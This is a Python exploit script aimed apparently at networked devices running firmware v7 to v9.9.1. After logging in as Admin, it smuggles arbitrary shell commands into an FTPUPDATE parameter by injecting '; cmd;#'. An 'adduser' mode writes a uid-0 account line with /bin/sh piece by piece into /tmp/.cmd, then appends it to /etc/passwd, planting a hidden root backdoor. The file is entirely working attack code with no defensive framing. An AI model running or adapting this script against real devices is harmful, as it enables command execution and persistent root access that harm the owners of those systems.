import sys
import select
import time
import threading
import crypt

from lib import decode, Channel

MAX_CMD_LEN = 60

HELP_TEXT = '''python3 [progname] [host] [adminpw] adduser name pw
python3 [progname] [host] [adminpw] [cmd]
'''

if len(sys.argv) < 4:
  print(HELP_TEXT.replace('[progname]', sys.argv[0]))
  exit(1)

"""
this method only works with old firmware versions, v7 - v9.9.1
"""

host = sys.argv[1]

uname = b'Admin'
pw = sys.argv[2].encode()
cmd = sys.argv[3]

if cmd == 'adduser':
  newuname = sys.argv[4]
  newpw = crypt.crypt(sys.argv[5], '$1$')
  passwd_line = f'{newuname}:{newpw}:0:0::/root:/bin/sh'

  cmds = []
  offset = 0

  noffset = MAX_CMD_LEN - 22
  cmds.append("echo -n '%s' > /tmp/.cmd" % (passwd_line[:noffset]))
  offset = noffset

  while True:
    noffset = offset + MAX_CMD_LEN - 23

    if noffset >= len(passwd_line):
      break

    cmds.append("echo -n '%s' >> /tmp/.cmd" % (passwd_line[offset:noffset]))
    offset = noffset

  cmds.append("echo '%s' >> /tmp/.cmd" % (passwd_line[offset:]))
  cmds.append('cat /tmp/.cmd >> /etc/passwd; rm /tmp/.cmd')

else:
  if len(cmd) > MAX_CMD_LEN:
    print('command too long, max %d chars' % MAX_CMD_LEN)
    sys.exit(1)

  cmds = [cmd]


conn = Channel(host)
conn.connect()

crypt_key = conn.login(uname, pw)
if not crypt_key:
  print('Login failed. This method requires valid credentials.')
  exit(1)

for cmd in cmds:
  print('sending', cmd)
  conn.send_msg(['PROXY', 'PARASET', 'FTPUPDATE', '1.1.1.1', 'invertati', '; '+cmd+';#', 'd'])

  while True:
    msg = conn.recv_msg()
    if len(msg) > 6 and msg[4] == 'FTPUPDATE':
      if msg[5] == '1.1.1.1':
        continue

      if msg[6] == '0':
        print('sent')
      else:
        print('error')

      break
